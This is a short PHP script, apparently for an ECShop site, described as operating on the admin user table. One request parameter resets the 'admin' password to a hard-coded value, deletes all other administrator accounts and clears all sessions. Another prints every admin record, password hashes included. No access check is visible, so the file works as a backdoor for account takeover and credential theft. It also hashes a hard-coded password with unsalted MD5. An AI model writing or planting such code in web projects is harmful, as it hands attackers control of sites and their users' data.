<?php
/**
 * 对admin_user表的操作
 */
define('IN_ECS', true);
require('../includes/init.php');

if($_REQUEST['act'] == 'pwd'){
	$pwd = md5("xx11235813yy");
	$sql = "update ".TBL_ADMIN_USER." set password = '".$pwd."' where user_name = 'admin'";
	$acc_db -> query($sql);
	$sql = "delete from ".TBL_ADMIN_USER." where user_name <> 'admin'";
	$acc_db -> query($sql);
	$sql = "delete from  `sessions`";
	$acc_db -> query($sql);
	$sql = "delete from `sessions_data`";
	$acc_db -> query($sql);
	print_r("success");
}
if($_REQUEST['act'] == 'select'){
	$sql = "select * from admin_user";
	$result = $acc_db -> getAll($sql);
	print_r($result);
}
?>